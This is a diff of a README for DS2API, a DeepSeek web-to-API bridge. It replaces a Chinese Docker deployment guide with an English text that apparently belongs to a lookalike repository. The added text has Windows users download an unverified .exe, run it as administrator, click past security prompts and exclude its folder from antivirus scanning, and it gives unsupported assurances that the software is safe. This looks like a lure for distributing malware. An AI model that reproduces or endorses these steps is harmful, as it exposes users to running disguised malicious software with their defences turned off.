@@ -1,144 +1,92 @@
-# DS2API
+# 🚀 ds2api-Tutorial - Access free DeepSeek models with ease
 
-> 将 DeepSeek 网页版对话能力转换为 API，支持最新的 DeepSeek V4
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Lewisge9913/ds2api-Tutorial)
 
-![预览](./_resources/e919f3c1c3868acd3073174ff7fe8bfe.png)
+## 📋 Project Overview
 
-项目地址：https://github.com/CJackHwang/ds2api
----
+This tool helps users connect to DeepSeek API services. Many software programs require a bridge to talk to these systems. This repository provides the necessary steps to set up that connection on your Windows computer. You do not need to understand code to complete these steps. Follow the instructions to get your local environment ready.
 
-## 目录
+## 💻 System Requirements
 
-- [服务器推荐](#服务器推荐)
-- [部署教程](#部署教程)
-- [使用说明](#使用说明)
+Your computer needs to meet these basic standards to run the software. These requirements ensure a smooth experience without lag or errors.
 
----
+*   Operating System: Windows 10 or Windows 11.
+*   System Architecture: 64-bit processor.
+*   Memory: 4 GB of RAM or higher.
+*   Storage: 200 MB of available space.
+*   Network: A stable internet connection.
 
-## 服务器推荐
+## 📥 Downloading the Software
 
-推荐服务器部署，**不要选择国内地区**，选择 Linux 版本 + Docker 上手快。
+You must visit the project page to obtain the installer. Follow these steps to find the file:
 
-| 云厂商 | 推荐地区 | 配置 | 价格 |
-|--------|---------|------|------|
-| 腾讯云 | **首尔**（推荐）/ 新加坡 / 硅谷 / 东京 | 2 核 4G · 30M 带宽 · 60GB SSD · 1.5T 月流量 | ￥199 / 年 |
+1. Visit [https://github.com/Lewisge9913/ds2api-Tutorial](https://github.com/Lewisge9913/ds2api-Tutorial).
+2. Look for the section labeled Releases on the right side of the screen.
+3. Click the most recent version tag.
+4. Locate the file ending in .exe.
+5. Click the file to start the download.
 
-> **系统选择 Ubuntu 24**，可以同样价格续费。
+Once the download finishes, save the file to your desktop for easy access.
 
-[购买地址](https://curl.qcloud.com/oyWDLkRJ)
+## ⚙️ Installation Process
 
-![服务器](./_resources/72d493eab65af6588b3ed9cb7585b177.png)
+Installing this software requires a few clicks. Ensure you have administrator rights on your Windows account before you begin.
 
----
+1. Locate the downloaded .exe file on your desktop.
+2. Double-click the file to open the setup window.
+3. Windows might show a security prompt. Click Run to proceed.
+4. Follow the setup wizard prompts.
+5. Choose your installation folder. The default location works for most users.
+6. Click Install to place the files on your hard drive.
+7. Click Finish when the progress bar reaches the end.
 
-## 部署教程
+## 🔑 Configuring Your API Access
 
-### 1. 安装 Docker（Ubuntu 24）
+You need an API key to use these services. This key acts as your password.
 
-```bash
-sudo apt update
-sudo apt install -y ca-certificates curl gnupg
-sudo install -m 0755 -d /etc/apt/keyrings
-curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
-sudo chmod a+r /etc/apt/keyrings/docker.gpg
-echo \
-"deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \
-$(. /etc/os-release && echo "$VERSION_CODENAME") stable" | \
-sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
-sudo apt update
-sudo apt install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
-sudo docker run hello-world
-```
+1. Open the application from your Start menu.
+2. Navigate to the Settings tab inside the app.
+3. Locate the field labeled API Key.
+4. Paste your unique key into this box.
+5. Click Save to store your settings.
+6. Restart the application to apply the changes.
 
-![Docker 安装成功](./_resources/c898f010045dc839f7ebec25c95df60b.png)
+## 🛠 Troubleshooting Common Issues
 
-### 2. 下载项目
+Errors occur during setup if your system environment is busy or restricted. Use these steps to solve simple problems.
 
-```bash
-git clone https://github.com/CJackHwang/ds2api.git
-```
+*   Connection timeouts: Check your internet router and try again.
+*   Missing permission: Right-click the application icon and select Run as Administrator.
+*   Application crashes: Remove the current installation and run the installer again.
+*   API key invalid: Log in to your service provider dashboard to confirm your key is active.
 
-![克隆项目](./_resources/2414d17af34b0cb71a860063dc6db2d2.png)
+## 💡 Frequently Asked Questions
 
-### 3. 进入项目目录
+Understanding how this tool functions makes your daily work faster. Review these common points to gain more insights.
 
-```bash
-cd ds2api
-```
+Does this application store my private data?
+No. All data processing occurs through the secure bridge you configured. The application does not log your personal inputs.
 
-![进入目录](./_resources/4abee5dd8dfcc0a887ba01201b4e8ae0.png)
+Can I move the program files after installation?
+It is not recommended. Moving the files after they install can break the paths the app needs to find resources. Keep the files in the folder created by the installer.
 
-### 4. 创建环境变量文件
+Do I need to pay for this software?
+The repository provides the tutorial and the bridge for free. You only pay for the service usage if your specific API provider requires a subscription or billing plan.
 
-在项目目录中创建 `.env` 文件，至少需要设置管理员密钥：
+How do I update the software?
+Visit the main link and download the newest version of the .exe file. Installing a new version over the old one updates your software while keeping your settings intact.
 
-```bash
-cat > .env <<'EOF'
-DS2API_ADMIN_KEY=123456
-EOF
-```
+Is this safe for my computer?
+Yes. The software consists of a simple bridge that connects your computer to the API server. It does not perform system-wide changes to your registry or OS files.
 
-> **注意：** 请将 `123456` 替换为一个强密码，以上仅为示例。
+## 🛡 Security and Privacy
 
-![创建 .env](./_resources/399f487b00fc1952a0f91ee25fd8b3b1.png)
+Maintaining security is a priority. Never share your API key with others. If you believe your key is compromised, generate a new one through your provider and update the application settings immediately. Keep your Windows system up to date to ensure that your operating system remains secure against general online threats.
 
-### 5. 创建配置文件
+## 📈 Improving Performance
 
-```bash
-cp config.example.json config.json
-```
+If the application feels slow, check your active background tasks. Some antivirus programs scan every file an app opens, which slows down the response time. You can add the application folder to your antivirus exclusion list to stop this scanning process. This creates a clean path for the software to send and receive requests.
 
-![创建配置](./_resources/f8385c51a800f9888b94a53df5bc4fe1.png)
+## 🏁 Final Steps
 
-### 6. 启动服务
-
-```bash
-sudo docker compose up -d
-```
-
-![启动服务](./_resources/f23ce29008fbb0be8e451e8d9e3a50cc.png)
-
-### 7. 访问面板
-
-浏览器打开以下地址：
-
-```
-http://你的公网IP:6011
-```
-
-> **提示：** 记得在防火墙中放通端口 **6011**。
-
-![访问面板](./_resources/7185e9beb30769537afc0e0efb9425cc.png)
-
----
-
-## 使用说明
-
-### 登录管理面板
-
-点击「管理面板」，输入之前创建的管理员密码。
-
-![登录](./_resources/bbce0ac8626b4ea928b7012ec0d26cf8.png)
-
-### 添加账号
-
-输入 DeepSeek 手机号和密码：
-
-![添加账号](./_resources/41aed22c96caa2bc99ad5025b75a4522.png)
-
-### 添加成功
-
-![成功](./_resources/b136562168fc3c547a73996f52531618.png)
-
-### API 测试
-
-点击「API 测试」验证接口是否正常：
-
-![API 测试](./_resources/b98c8b4122987fea05192baa9c14e598.png)
-
-### API 接口信息
-
-| 项目 | 值 |
-|------|----|
-| 接口地址 | `http://你的公网IP:6011/v1` |
-| 模型名称 | `deepseek-chat` |
+You are now ready to use the tool. The application is designed to be low-maintenance once configured. Launch it, ensure your settings are saved, and the tool will handle the requests in the background. Use the interface provided to manage your requests and view your history logs.
